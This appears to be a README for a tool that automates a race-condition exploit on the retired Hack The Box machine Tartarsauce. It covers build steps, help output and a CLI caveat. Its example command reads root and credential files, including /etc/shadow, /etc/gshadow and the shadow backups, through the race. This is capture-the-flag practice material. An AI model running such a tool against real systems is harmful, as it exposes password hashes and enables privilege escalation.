# Automated exploit of race condition in HTB's Tartarsauce

## Build

```
git clone https://github.com/epi052/htb-scripts-for-retired-boxes.git
cd htb-scripts-for-retired-boxes/tartarsauce
python3 -m pip install pyinotify --target triggered
python3 -m zipapp -p "/usr/bin/env python3" triggered
```

## Execution

```
chmod +x triggered.pyz
./triggered.pyz -h 

usage: triggered.pyz [-h] to_watch --to_read [TO_READ [TO_READ ...]] 

positional arguments:
  to_watch              Directory to watch for events

optional arguments:
  -h, --help            show this help message and exit
  --to_read [TO_READ [TO_READ ...]]
                        Space separated list of file names to be read from the
                        diff
```

## Examples

```
./triggered.pyz /var/tmp --to_read /root/root.txt /var/backups/gshadow.bak /var/backups/shadow.bak /var/backups/passwd.bak /var/backups/group.bak /etc/shadow /etc/gshadow
```

## CLI Gotcha

Due to allowing an arbitrary number of files in the `--to_read` option, the positional argument `to_watch` **MUST** come before `--to_read`, otherwise the program has no idea where `--to_read` stops and the `to_watch` directory begins.